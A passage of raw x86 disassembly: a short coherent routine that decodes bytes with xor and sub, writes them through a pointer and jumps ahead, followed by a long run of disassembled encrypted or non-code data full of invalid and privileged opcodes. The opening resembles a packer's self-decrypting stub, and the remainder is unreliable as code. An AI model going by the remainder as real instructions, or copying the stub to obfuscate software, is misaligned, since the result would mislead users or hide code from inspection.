  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fs fsubr st(5),st
  40389a:	dec    esi
  40389b:	inc    ecx
  40389c:	and    ebp,ebx
  40389e:	pop    edi
  40389f:	bound  esp,QWORD PTR [edx-0x23]
  4038a2:	pop    edi
  4038a3:	bound  esp,QWORD PTR [edx-0x20]
  4038a6:	ret    0xba01
  4038a9:	cwde   
  4038aa:	sub    dh,BYTE PTR [ecx+ecx*8+0x45f82a01]
  4038b1:	and    al,0xec
  4038b3:	or     BYTE PTR [edx+0x5e0deb61],al
  4038b9:	mov    cl,0xf4
  4038bb:	fisttp QWORD PTR [edi]
  4038bd:	repnz add dh,BYTE PTR [ecx+0x29]
  4038c1:	or     ebp,DWORD PTR [ecx]
  4038c3:	mov    es,WORD PTR [ecx-0x23]
  4038c6:	xchg   DWORD PTR ds:0x531892ff,eax
  4038cc:	pop    ecx
  4038cd:	add    eax,0x3f594699
  4038d2:	inc    ebp
  4038d3:	sar    ebx,1
  4038d5:	stos   DWORD PTR es:[edi],eax
  4038d6:	mov    ecx,0x11e648cd
  4038db:	leave  
  4038dc:	jo     0x403924
  4038de:	and    BYTE PTR [ecx+0x561d0a35],bl
  4038e4:	mov    fs,WORD PTR [edi+0x3]
  4038e7:	and    al,0x66
  4038e9:	in     al,0x16
  4038eb:	retf   
  4038ec:	mov    ch,0x1
  4038ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038ef:	mov    BYTE PTR [ecx+0x1069a477],0x5d
  4038f6:	adc    ecx,DWORD PTR [ebp+0x32ada19]
  4038fc:	jmp    0x403906
  4038fe:	gs mov esp,0xc682a82d
  403904:	nop
  403905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403906:	inc    ebp
  403907:	sbb    al,0x1f
  403909:	pushf  
  40390a:	retf   0x4a37
  40390d:	or     BYTE PTR [edi+0x57c50a54],dl
  403913:	dec    esi
  403914:	cdq    
  403915:	push   cs
  403916:	clc    
  403917:	xchg   ecx,eax
  403918:	popa   
  403919:	inc    esi
  40391a:	inc    ebp
  40391b:	mov    esi,0xf7a98b9
  403920:	mov    edx,0x1ea7f1ad
  403925:	inc    ebp
  403926:	and    dl,BYTE PTR [esi-0x7]
  403929:	sbb    BYTE PTR [eax],0x8
  40392c:	neg    BYTE PTR [edx-0x3784c8d9]
  403932:	pop    esi
  403933:	pusha  
  403934:	xor    al,0x90
  403936:	jp     0x4038e3
  403938:	aam    0x69
  40393a:	out    dx,eax
  40393b:	pop    edi
  40393c:	imul   edi,DWORD PTR [esi-0x69bb4891],0xd9db0606
  403946:	jae    0x403914
  403948:	cdq    
  403949:	xor    al,0xae
  40394b:	mov    edi,0xe5735208
  403950:	mov    eax,ds:0xd91923c0
  403955:	jo     0x403982
  403957:	out    0x59,al
  403959:	adc    DWORD PTR [eax-0x19],edx
  40395c:	lods   eax,DWORD PTR ds:[esi]
  40395d:	mov    cl,0x7a
  40395f:	sub    cl,BYTE PTR [edx-0x17fdb255]
  403965:	push   0x31
  403967:	or     BYTE PTR [eax],dl
  403969:	cmp    esi,DWORD PTR [edx+0x3ec9c46e]
  40396f:	mov    al,ds:0xd108fd63
  403974:	mov    ah,0x5d
  403976:	dec    ecx
  403977:	adc    DWORD PTR [ebp-0x50],0x7ffad41b
  40397e:	inc    esp
  40397f:	les    esi,FWORD PTR [ecx-0x22]
  403982:	add    cl,BYTE PTR [ebx*4+0x2cb117be]
  403989:	mov    fs,WORD PTR [edi+0x55]
  40398c:	(bad)  
  40398d:	out    0xdc,al
  40398f:	js     0x403990
  403991:	mov    edi,0xed54127c
  403996:	jp     0x403938
  403998:	hlt    
  403999:	jae    0x403949
  40399b:	fidivr WORD PTR [esi]
  40399d:	add    BYTE PTR [esi-0x57],bl
  4039a0:	push   ebx
  4039a1:	int3   
  4039a2:	pop    ebx
  4039a3:	push   ebx
  4039a4:	sub    esp,esp
  4039a6:	push   esi
  4039a7:	xchg   DWORD PTR [edi],edi
  4039a9:	daa    
  4039aa:	inc    ebx
  4039ab:	mov    cl,0xd3
  4039ad:	or     al,0x9d
  4039af:	bound  edx,QWORD PTR [eax-0x9]
  4039b2:	or     eax,0xea5f820d
  4039b7:	pop    ds
  4039b8:	std    
  4039b9:	add    eax,0xf39e44a3
  4039be:	out    0x23,al
  4039c0:	scas   eax,DWORD PTR es:[edi]
  4039c1:	sbb    BYTE PTR [ebx],0x8
  4039c4:	sub    BYTE PTR [ecx+edi*4+0x4c],al
  4039c8:	and    edi,edi
  4039ca:	push   esi
  4039cb:	ret    0xdccf
  4039ce:	addr16 mov cs:0x9f8c,eax
  4039d3:	jle    0x403a13
  4039d5:	out    0x82,al
  4039d7:	dec    ecx
  4039d8:	out    0x78,al
  4039da:	sub    DWORD PTR [eax+ebp*2+0x6e25d61a],0x9283831b
  4039e5:	or     DWORD PTR [eax+0x6c34229f],0xffffffd9
  4039ec:	scas   al,BYTE PTR es:[edi]
  4039ed:	dec    esi
  4039ee:	gs jl  0x4039f3
  4039f1:	int3   
  4039f2:	pop    ss
  4039f3:	cmp    BYTE PTR [edi+0x65],dh
  4039f6:	(bad)  
  4039f7:	aad    0x35
  4039f9:	pop    edx
  4039fa:	inc    edx
  4039fb:	jmp    0x12e7:0x4d7035d5
  403a02:	arpl   WORD PTR [ebp-0x55163144],di
  403a08:	sub    DWORD PTR [ebp+0x1d],esi
  403a0b:	mov    bh,0xe9
  403a0d:	jae    0x403a74
  403a0f:	fwait
  403a10:	sti    
  403a11:	add    ch,BYTE PTR [ecx-0x586f69c6]
  403a17:	mov    al,ds:0xffc95d41
  403a1c:	inc    esp
  403a1d:	std    
  403a1e:	aaa    
  403a1f:	scas   eax,DWORD PTR es:[edi]
  403a20:	mov    esp,0x7229435d
  403a25:	inc    ebp
  403a26:	adc    ch,bl
  403a28:	shr    DWORD PTR gs:0x1c1d4218,0x3f
  403a30:	and    al,0x8e
  403a32:	mov    esi,0x97419996
  403a37:	rcr    BYTE PTR [ebx+0x55f8b5a3],cl
  403a3d:	sti    
  403a3e:	fdivr  DWORD PTR [esi+0x6dbf8e5b]
  403a44:	fwait
  403a45:	cmp    cl,BYTE PTR [ebx]
  403a47:	es mov ah,0xf0
  403a4a:	push   edi
  403a4b:	je     0x4039f1
  403a4d:	repnz mov cs,WORD PTR [ecx+edx*1-0x50]
  403a52:	repz push ecx
  403a54:	(bad)  
  403a55:	(bad)  
  403a57:	les    ebx,FWORD PTR [eax-0x1936d32f]
  403a5d:	test   DWORD PTR [ebp+0x762dae89],esp
  403a63:	xchg   ebp,eax
  403a64:	ja     0x4039fb
  403a66:	push   edi
  403a67:	adc    al,0xcb
  403a69:	adc    edi,DWORD PTR [edi-0x3e]
  403a6c:	sahf   
  403a6d:	adc    BYTE PTR [ecx-0x61],0x67
  403a71:	jg     0x403acb
  403a73:	pop    es
  403a74:	pusha  
  403a75:	sbb    al,0x0
  403a77:	or     dl,bl
  403a79:	or     esi,DWORD PTR ds:0xdd1ce809
  403a7f:	fs xor eax,0xa0959d53
  403a85:	cmp    al,0x5e
  403a87:	lods   al,BYTE PTR ds:[esi]
  403a88:	sbb    ch,BYTE PTR [esp+ecx*1-0x52]
  403a8c:	pop    edx
  403a8d:	pop    eax
  403a8e:	jo     0x403ab1
  403a90:	sub    DWORD PTR [edi+0x65af205a],ebx
  403a96:	frstor [eax+0xcf417e3]
  403a9c:	leave  
  403a9d:	mov    ah,BYTE PTR [edi-0x34]
  403aa0:	daa    
  403aa1:	inc    eax
  403aa2:	rcl    BYTE PTR [edx-0x757277c0],1
  403aa8:	jbe    0x403aad
  403aaa:	mov    esi,DWORD PTR [eax+0x150dddb0]
  403ab0:	push   eax
  403ab1:	mov    eax,es
  403ab3:	(bad)  
  403ab4:	mov    ah,0x58
  403ab6:	ud1    edx,ecx
  403ab9:	dec    ebp
  403aba:	add    ch,BYTE PTR ds:0xe33dcbfd
  403ac0:	ss cld 
  403ac2:	out    dx,al
  403ac3:	xlat   BYTE PTR ds:[ebx]
  403ac4:	sbb    ch,BYTE PTR [ecx]
  403ac6:	or     eax,DWORD PTR [ebp+0x3666165b]
  403acc:	push   0x17
  403ace:	imul   esi,DWORD PTR [edx+edi*4+0x551ba386],0xffffff9c
  403ad6:	cdq    
  403ad7:	mov    al,0x8f
  403ad9:	pop    ds
  403ada:	arpl   dx,sp
  403adc:	ffreep st(1)
  403ade:	ror    BYTE PTR [ebx+0x21],cl
  403ae1:	aas    
  403ae2:	fs div edi
  403ae5:	cmp    DWORD PTR [ecx+eax*2],ebx
  403ae8:	faddp  st(2),st
  403aea:	push   0xe
  403aec:	and    edx,DWORD PTR [ebx+ebx*1]
  403aef:	std    
  403af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af1:	lods   al,BYTE PTR ds:[esi]
  403af2:	xor    ch,BYTE PTR [esi+0x530298af]
  403af8:	lock repnz lahf 
  403afb:	mov    al,0xe1
  403afd:	fild   QWORD PTR [ebx-0x5a]
  403b00:	mov    dl,0x4f
  403b02:	in     al,0xf5
  403b04:	rol    edx,cl
  403b06:	pop    ds
  403b07:	inc    esp
  403b08:	jmp    0x403ac9
  403b0a:	sub    al,0xc9
  403b0c:	adc    BYTE PTR [ebp+0x4d],ch
  403b0f:	clc    
  403b10:	dec    ebx
  403b11:	or     cl,BYTE PTR [ebp-0x69]
  403b14:	scas   al,BYTE PTR es:[edi]
  403b15:	cmp    ebx,DWORD PTR [ebp-0x10]
  403b18:	in     eax,dx
  403b19:	jo     0x403aed
  403b1b:	or     eax,0x61983ad3
  403b20:	std    
  403b21:	adc    edx,DWORD PTR [ebx+0x608cded]
  403b27:	mov    esi,0xe2933eea
  403b2c:	fdiv   QWORD PTR [ecx]
  403b2e:	hlt    
  403b2f:	xor    al,0x4e
  403b31:	sub    BYTE PTR [ecx-0x7206c22f],dh
  403b37:	cmp    BYTE PTR [edi-0x5ab604d8],dh
  403b3d:	add    ecx,DWORD PTR [eax-0xeac2046]
  403b43:	popf   
  403b44:	stc    
  403b45:	dec    eax
  403b46:	arpl   WORD PTR [ebp+edx*4+0x1],di
  403b4a:	(bad)  
  403b4b:	sar    esp,1
  403b4d:	imul   esp,DWORD PTR [ebp-0x32949212],0x20d6470d
  403b57:	add    ebx,DWORD PTR [ebp+0x7c17d8d7]
  403b5d:	cmc    
  403b5e:	push   ds
  403b5f:	mov    ah,0x40
  403b61:	xchg   BYTE PTR [ecx-0x1],ch
  403b64:	fcomp  DWORD PTR [esi+0x52]
  403b67:	mov    ebp,0xc74feb32
  403b6c:	test   BYTE PTR [edi+eiz*4+0x3f],dh
  403b70:	inc    ebp
  403b71:	ret    
  403b72:	push   es
  403b73:	sub    al,BYTE PTR [esi+0x5bdcafbe]
  403b79:	push   ecx
  403b7a:	push   edi
  403b7b:	and    dh,BYTE PTR [edx-0x76]
  403b7e:	rol    DWORD PTR [esi],cl
  403b80:	xchg   esi,eax
  403b81:	mov    cs,WORD PTR [eax+0x2c917ca0]
  403b87:	mov    eax,ds:0x73173045
  403b8c:	scas   al,BYTE PTR es:[edi]
  403b8d:	xchg   esp,eax
  403b8e:	test   DWORD PTR ds:0xdd20a37,ecx
  403b94:	out    dx,al
  403b95:	addr16 jle 0x403be6
  403b98:	mov    ebx,0x8c04e4b0
  403b9d:	inc    esp
  403b9e:	ss mov ecx,0x4b08ebf
  403ba4:	ret    0x4fa9
  403ba7:	mov    dl,0xaf
  403ba9:	mov    DWORD PTR [ecx+0x19],eax
  403bac:	pop    es
  403bad:	jle    0x403bfd
  403baf:	sub    al,al
  403bb1:	inc    ebx
  403bb2:	pop    edi
  403bb3:	out    dx,eax
  403bb4:	retf   0x4173
  403bb7:	mov    edi,0xcf5ac1ca
  403bbc:	js     0x403be8
  403bbe:	inc    eax
  403bbf:	xor    eax,0x1070ddab
  403bc4:	outs   dx,DWORD PTR ds:[esi]
  403bc5:	cmp    bh,BYTE PTR [esp+ebx*2]
  403bc8:	sub    ch,cl
  403bca:	sbb    eax,0x42be0eb2
  403bcf:	clc    
  403bd0:	ins    BYTE PTR es:[edi],dx
  403bd1:	add    ebx,edi
  403bd3:	outs   dx,BYTE PTR ds:[esi]
  403bd4:	mov    ebp,0xfbb9a845
  403bd9:	ins    DWORD PTR es:[edi],dx
  403bda:	aas    
  403bdb:	push   eax
  403bdc:	xchg   ebp,eax
  403bdd:	jno    0x403b98
  403bdf:	in     al,dx
  403be0:	popa   
  403be1:	jnp    0x403c00
  403be3:	sub    edi,DWORD PTR [eax]
  403be5:	pushf  
  403be6:	stos   DWORD PTR es:[edi],eax
  403be7:	and    eax,0x984d4872
  403bec:	rcl    BYTE PTR [edi+0x3864de85],1
  403bf2:	xor    eax,0xb4e2c11d
  403bf7:	lds    eax,FWORD PTR fs:[edi+0x5a656b93]
  403bfe:	fidiv  WORD PTR [eax+0x52cddf9f]
  403c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c05:	(bad)  
  403c06:	and    edx,DWORD PTR [eax-0x6d8e0d4e]
  403c0c:	outs   dx,DWORD PTR ds:[esi]
  403c0d:	dec    edx
  403c0e:	pop    esi
  403c0f:	and    eax,0x15d34187
  403c14:	xor    DWORD PTR [edx+0x42142829],ebx
  403c1a:	loop   0x403c4d
  403c1c:	fdivr  DWORD PTR [ecx]
  403c1e:	mov    eax,0x5ba95a08
  403c23:	out    0x22,eax
  403c25:	inc    edx
  403c26:	ins    BYTE PTR es:[edi],dx
  403c27:	mov    eax,ds:0x5628b28e
  403c2c:	jae    0x403c96
  403c2e:	or     DWORD PTR [esi],ebx
  403c30:	inc    ecx
  403c31:	adc    cl,ch
  403c33:	mov    ds:0x4036a79e,eax
  403c38:	mov    ecx,0x473d5c0b
  403c3d:	mov    BYTE PTR [edx+0x12c56cce],cl
  403c43:	jne    0x403c93
  403c45:	jmp    0x9cfa:0x18a0051e
  403c4c:	jbe    0x403cb1
  403c4e:	repnz ins BYTE PTR es:[edi],dx
  403c50:	adc    eax,0xb5b42375
  403c55:	aas    
  403c56:	fidivr DWORD PTR [ebx+esi*2+0x53]
  403c5a:	xchg   DWORD PTR ds:0x6db416c5,eax
  403c60:	(bad)  
  403c62:	shl    DWORD PTR [ebp-0xaf0c6c5],0x2b
  403c69:	jns    0x403ce7
  403c6b:	retf   0x479d
  403c6e:	fidiv  DWORD PTR ds:0x801a0180
  403c74:	xor    edx,edx
  403c76:	pop    esp
  403c77:	rcl    DWORD PTR [ebp-0x1838d576],1
  403c7d:	dec    esi
  403c7e:	push   esp
  403c7f:	jae    0x403c82
  403c81:	fst    DWORD PTR [ebx]
  403c83:	jmp    0x2bcda40e
  403c88:	jns    0x403ced
  403c8a:	inc    ebp
  403c8b:	sub    BYTE PTR [esi+0x26],al
  403c8e:	jb     0x403c26
  403c90:	repz sbb dh,0x2c
  403c94:	scas   eax,DWORD PTR es:[edi]
  403c95:	stos   DWORD PTR es:[edi],eax
  403c96:	scas   eax,DWORD PTR es:[edi]
  403c97:	dec    edi
  403c98:	push   edx
  403c99:	test   dl,0x13
  403c9c:	xor    eax,DWORD PTR [ecx-0x5f]
  403c9f:	xlat   BYTE PTR ds:[ebx]
  403ca0:	test   al,0x5
  403ca2:	mov    al,ds:0x12209d05
  403ca7:	fs xor eax,0x24dc6f97
  403cad:	sbb    al,0x9c
  403caf:	push   ds
  403cb0:	cli    
  403cb1:	dec    edi
  403cb2:	ins    DWORD PTR es:[edi],dx
  403cb3:	iret   
  403cb4:	nop
  403cb5:	repnz dec edx
  403cb7:	test   DWORD PTR [ecx],ecx
  403cb9:	jle    0x403d0e
  403cbb:	leave  
  403cbc:	mov    esi,esp
  403cbe:	mov    ecx,0xacd88ba4
  403cc3:	retf   
  403cc4:	cmp    eax,0x1638d8be
  403cc9:	cmp    ebx,DWORD PTR [esi-0x4c95f482]
  403ccf:	mov    DWORD PTR [esi-0x790dd5a5],esp
  403cd5:	es xchg ebp,ebx
  403cd8:	fistp  DWORD PTR [esi+0x16c74ff0]
  403cde:	adc    DWORD PTR [edx+ebp*8+0x7e449599],esp
  403ce5:	(bad)  
  403ce6:	shr    BYTE PTR [eax-0x16],cl
  403ce9:	retf   
  403cea:	add    eax,0x736476d9
  403cef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cf0:	xor    ecx,edi
  403cf2:	das    
  403cf3:	pop    edx
  403cf4:	mov    ecx,0xb1864426
  403cf9:	push   esp
  403cfa:	add    DWORD PTR [edx],edx
  403cfc:	retf   0x173a
  403cff:	dec    eax
  403d00:	fdivr  st(7),st
  403d02:	mov    bh,0x6e
  403d04:	call   0x5c58d3c2
  403d09:	sbb    bl,BYTE PTR [edx]
  403d0b:	mov    edi,0xff8bb6a1
  403d10:	or     esi,DWORD PTR [edi-0x10]
  403d13:	leave  
  403d14:	sub    ebx,DWORD PTR [eax]
  403d16:	rcr    DWORD PTR [ecx-0x2f],1
  403d19:	mov    edi,es
  403d1b:	ins    DWORD PTR es:[edi],dx
  403d1c:	in     al,0x15
  403d1e:	xchg   BYTE PTR ds:[esi],al
  403d21:	psubsb mm5,mm3
  403d24:	adc    bl,dh
  403d26:	ins    DWORD PTR es:[edi],dx
  403d27:	cmp    eax,0xb5c0e9c0
  403d2c:	shl    DWORD PTR [edi],0xff
  403d2f:	lods   eax,DWORD PTR ds:[esi]
  403d30:	stos   BYTE PTR es:[edi],al
  403d31:	addr16 pop es
  403d33:	lods   al,BYTE PTR ds:[esi]
  403d34:	cld    
  403d35:	xor    esp,DWORD PTR [ecx]
  403d37:	xor    BYTE PTR [eax-0x328f82ad],bl
  403d3d:	pop    edi
  403d3e:	mov    BYTE PTR [edi+0x350e4f1e],dh
  403d44:	push   ss
  403d45:	addr16 sbb eax,0xd76c3a
  403d4b:	xchg   BYTE PTR [edx],dl
  403d4d:	xchg   ebx,eax
  403d4e:	(bad)  
  403d50:	push   ebx
  403d51:	bound  ebp,QWORD PTR [esp+eax*2]
  403d54:	adc    al,0x7b
  403d56:	hlt    
  403d57:	jo     0x403dc8
  403d59:	clc    
  403d5a:	add    ecx,DWORD PTR [ecx-0x45d57dd4]
  403d60:	fidivr WORD PTR [edx]
  403d62:	rol    esi,1
  403d64:	outs   dx,BYTE PTR ds:[esi]
  403d65:	jns    0x403d4b
  403d67:	inc    edx
  403d68:	(bad)
  403d6c:	into   
  403d6d:	add    eax,0xfe2fd8ce
  403d72:	add    esi,DWORD PTR [esi]
  403d74:	dec    DWORD PTR [eax+0x4d0f972]
  403d7a:	cwde   
  403d7b:	adc    eax,0xb1d81d88
  403d80:	push   cs
  403d81:	sbb    eax,0xb745a2ca
  403d86:	push   cs
  403d87:	ja     0x403d7e
  403d89:	cdq    
  403d8a:	ret    
  403d8b:	ror    BYTE PTR [eax-0x2b2bc2d0],1
  403d91:	fidiv  DWORD PTR [edx-0x770e0a35]
  403d97:	dec    esp
  403d98:	scas   eax,DWORD PTR es:[edi]
  403d99:	jae    0x403d5c
  403d9b:	inc    esi
  403d9c:	xchg   ebx,eax
  403d9d:	sbb    BYTE PTR [esp+esi*4+0x7f],0x94
  403da2:	mov    edx,0xc76b03a8
  403da7:	arpl   WORD PTR ds:0xe1c689ef,si
  403dad:	jb     0x403d47
  403daf:	cmp    edx,DWORD PTR [ecx]
  403db1:	test   eax,0xdeecccbc
  403db6:	sub    BYTE PTR [eax+0x5bce5985],bh
  403dbc:	pusha  
  403dbd:	adc    DWORD PTR [edx+0x1f],edi
  403dc0:	fimul  DWORD PTR [ebx-0x40]
  403dc3:	test   DWORD PTR [ecx-0x6e],edx
  403dc6:	mov    bh,0x8d
  403dc8:	inc    esi
  403dc9:	dec    edx
  403dca:	shl    bl,1
  403dcc:	retf   
  403dcd:	jno    0x403dae
  403dcf:	jo     0x403dff
  403dd1:	jecxz  0x403d73
  403dd3:	aad    0xa3
  403dd5:	int3   
  403dd6:	lods   al,BYTE PTR ds:[esi]
  403dd7:	jns    0x403d5a
  403dd9:	fld    QWORD PTR [ebp+0x9]
  403ddc:	cmp    ebx,DWORD PTR [ecx-0x76e29cfc]
  403de2:	int    0x48
  403de4:	(bad)  
  403de5:	cdq    
  403de6:	repz push ecx
  403de8:	inc    ebp
  403de9:	fstp   QWORD PTR [ecx]
  403deb:	inc    eax
  403dec:	cli    
  403ded:	test   BYTE PTR [edx+0x2e],bh
  403df0:	and    DWORD PTR [esi+0x6cbcce6c],esi
  403df6:	rcl    DWORD PTR ss:[edx],1
  403df9:	std    
  403dfa:	dec    esi
  403dfb:	fadd   QWORD PTR [eax+0x9]
  403dfe:	adc    ebx,edx
  403e00:	pop    edi
  403e01:	scas   al,BYTE PTR es:[edi]
  403e02:	aaa    
  403e03:	jnp    0x403df6
  403e05:	or     ebp,DWORD PTR fs:[edi-0x212c3d6d]
  403e0c:	dec    esp
  403e0d:	sub    ecx,DWORD PTR [esi-0x65]
  403e10:	dec    eax
  403e11:	aam    0xf6
  403e13:	loopne 0x403d9b
  403e15:	enter  0x78df,0x2
  403e19:	add    bl,BYTE PTR [ecx+0xf6cafad]
  403e1f:	xchg   esi,eax
  403e20:	leave  
  403e21:	dec    BYTE PTR [ecx+0x6321d88]
  403e27:	test   dl,0x50
  403e2a:	or     dh,BYTE PTR [edx+0x4d]
  403e2d:	ss (bad) 
  403e2f:	out    dx,al
  403e30:	jne    0x403dc3
  403e32:	mov    WORD PTR cs:[ecx-0x64],di
  403e37:	mov    DWORD PTR [ebx+0x35],ebp
  403e3a:	and    eax,0x1343af58
  403e3f:	gs push ecx
  403e41:	sbb    BYTE PTR [ecx],0x8e
  403e44:	add    eax,0x281c0072
  403e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e4a:	push   eax
  403e4b:	sti    
  403e4c:	int    0x56
  403e4e:	aaa    
  403e4f:	ficomp WORD PTR [eax]
  403e51:	xor    bh,BYTE PTR [ebx-0x747f9c95]
  403e57:	out    dx,eax
  403e58:	inc    edx
  403e59:	sbb    edx,edx
  403e5b:	mov    ds:0x757ae1e,eax
  403e60:	dec    ecx
  403e61:	hlt    
  403e62:	mov    cs,WORD PTR [eax]
  403e64:	cmp    dh,BYTE PTR [edi-0x40]
  403e67:	dec    ecx
  403e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e69:	std    
  403e6a:	or     ebp,DWORD PTR [edx-0x49f2ed3d]
  403e70:	ror    BYTE PTR [esi+0x71],1
  403e73:	test   eax,0x1aa2c2ab
  403e78:	sbb    BYTE PTR [edi-0x2],0xf8
  403e7c:	jle    0x403eac
  403e7e:	adc    BYTE PTR [esi+0x30],cl
  403e81:	pop    edi
  403e82:	jl     0x403e27
  403e84:	pop    ebp
  403e85:	mov    DWORD PTR [ecx+0x66],edi
  403e88:	fdiv   QWORD PTR [ebx]
  403e8a:	loopne 0x403e88
  403e8c:	mov    ecx,0xafa9bbee
  403e91:	mov    BYTE PTR [ebx-0x25f1b856],bl
  403e97:	ja     0x403e96
  403e99:	das    
  403e9a:	shl    ah,0x11
  403e9d:	fstp   TBYTE PTR [ecx+0x46f8ddbd]
  403ea3:	push   ss
  403ea4:	jmp    0x403f0a
  403ea6:	in     eax,dx
  403ea7:	mov    edx,0xe42e7c80
  403eac:	sub    eax,0x3adc3748
  403eb1:	sbb    BYTE PTR [esp+eax*2+0xf],dl
  403eb5:	ret    0xcd1b
  403eb8:	cwde   
  403eb9:	ret    0xa837
  403ebc:	mov    eax,ds:0xa1755c3a
  403ec1:	pop    ss
  403ec2:	rcr    DWORD PTR [ebx],cl
  403ec4:	push   edx
  403ec5:	jnp    0x403ebd
  403ec7:	dec    edx
  403ec8:	retf   
  403ec9:	test   al,0x84
  403ecb:	xor    al,0x49
  403ecd:	fs (bad) 
  403ecf:	fsub   QWORD PTR [ecx]
  403ed1:	xor    bl,BYTE PTR [ebx+ebp*4-0x10226be5]
  403ed8:	sub    ah,BYTE PTR [ebx+0x6d]
  403edb:	or     al,0x5d
  403edd:	sbb    ebp,DWORD PTR [esi]
  403edf:	push   ebp
  403ee0:	ret    
  403ee1:	fist   WORD PTR [ebx-0x5c5b3c3b]
  403ee7:	iret   
  403ee8:	push   0x43
  403eea:	or     esi,DWORD PTR [ecx]
  403eec:	cmp    DWORD PTR [eax-0x3952ee0],ecx
  403ef2:	xor    dl,dl
  403ef4:	sti    
  403ef5:	js     0x403eee
  403ef7:	adc    esi,DWORD PTR [esi]
  403ef9:	enter  0x2adb,0xf8
  403efd:	sbb    eax,0x91a04672
  403f02:	pop    edi
  403f03:	dec    BYTE PTR [eax+0x3a9c672d]
  403f09:	repnz icebp 
  403f0b:	adc    BYTE PTR [edi+0x4101ab8],0x1e
  403f12:	adc    DWORD PTR [ebx],esi
  403f14:	stos   DWORD PTR es:[edi],eax
  403f15:	pushf  
  403f16:	xor    eax,0xdac40e35
  403f1c:	ret    0x99bd
  403f1f:	cmp    edi,DWORD PTR [esi+ebx*8+0x5b8d57]
  403f26:	pop    esp
  403f27:	aam    0xed
  403f29:	jb     0x403ef8
  403f2b:	fistp  QWORD PTR [esi-0x21]
  403f2e:	pop    ecx
  403f2f:	cld    
  403f30:	popf   
  403f31:	paddq  mm0,QWORD PTR [edx]
  403f34:	adc    eax,0x39202471
  403f39:	jmp    0xca97:0x92f08d90
  403f40:	data16 (bad) 
  403f42:	loope  0x403f09
  403f44:	push   ebx
  403f45:	(bad)  
  403f46:	pop    ds
  403f47:	gs inc eax
  403f49:	jg     0x403fb7
  403f4b:	inc    edx
  403f4c:	ss inc ecx
  403f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f4f:	mov    ds:0xcd9b87f7,eax
  403f54:	mov    ch,0x48
  403f56:	imul   edi,DWORD PTR [ebp-0x5a813b6e],0x18
  403f5d:	push   0x35511cb2
  403f62:	ins    BYTE PTR es:[edi],dx
  403f63:	pop    ebp
  403f64:	sahf   
  403f65:	cmp    BYTE PTR [ecx],0x89
  403f68:	jns    0x403f3f
  403f6a:	ins    BYTE PTR es:[edi],dx
  403f6b:	adc    DWORD PTR [edx+0xb],edx
  403f6e:	dec    esi
  403f6f:	fdiv   st(2),st
  403f71:	pushf  
  403f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f73:	jno    0x403f1d
  403f75:	lock cs (bad) 
  403f78:	jb     0x403fa9
  403f7a:	repz and BYTE PTR [eax],cl
  403f7d:	mov    ch,BYTE PTR [ebx-0x1f]
  403f80:	jmp    0x6a645e85
  403f85:	inc    esi
  403f86:	xor    eax,0x2b36d17b
  403f8b:	fcomp  QWORD PTR [ebx+edx*1-0x5]
  403f8f:	mov    bl,BYTE PTR [edx+esi*2-0x3139b73f]
  403f96:	stos   BYTE PTR es:[edi],al
  403f97:	mov    al,ds:0x4ce234b2
  403f9c:	mov    ecx,0x11f8858c
  403fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa2:	aam    0x54
  403fa4:	cld    
  403fa5:	ss nop
  403fa7:	div    DWORD PTR [ecx+0x96bd762]
  403fad:	daa    
  403fae:	sahf   
  403faf:	push   edi
  403fb0:	lods   al,BYTE PTR ds:[esi]
  403fb1:	cli    
  403fb2:	into   
  403fb3:	ins    DWORD PTR es:[edi],dx
  403fb4:	cld    
  403fb5:	lock pop eax
  403fb7:	pop    edi
  403fb8:	xor    edi,edx
  403fba:	sti    
  403fbb:	and    eax,0x1c0253a1
  403fc0:	stos   BYTE PTR es:[edi],al
  403fc1:	rcr    BYTE PTR [eax],0xd8
  403fc4:	ret    0xac44
  403fc7:	xor    ch,al
  403fc9:	mov    ch,0xd5
  403fcb:	ficomp WORD PTR [edi-0x48]
  403fce:	in     eax,0xb9
  403fd0:	push   es
  403fd1:	push   0xffffff8b
  403fd3:	loop   0x403f62
  403fd5:	lods   al,BYTE PTR ds:[esi]
  403fd6:	loope  0x403fd5
  403fd8:	cmp    DWORD PTR [ebx],edi
  403fda:	sti    
  403fdb:	fnsave [eax-0x4aa111b5]
  403fe1:	cmc    
  403fe2:	fdiv   DWORD PTR [edx+edi*2+0x64]
  403fe6:	pusha  
  403fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe8:	test   eax,0x2d4f4e67
  403fed:	and    al,0x94
  403fef:	into   
  403ff0:	shr    eax,cl
  403ff2:	push   edx
  403ff3:	leave  
  403ff4:	push   esp
  403ff6:	sub    cl,ah
  403ff8:	add    ebp,DWORD PTR [edi]
  403ffa:	xchg   ebx,eax
  403ffb:	call   0xd117:0xc62639bd
  404002:	in     al,dx
  404003:	dec    ecx
  404004:	or     edx,DWORD PTR [ebx]
  404006:	adc    eax,eax
  404008:	(bad)  
  404009:	adc    bh,BYTE PTR [ecx]
  40400b:	out    0x5f,eax
  40400d:	xchg   esp,eax
  40400e:	push   eax
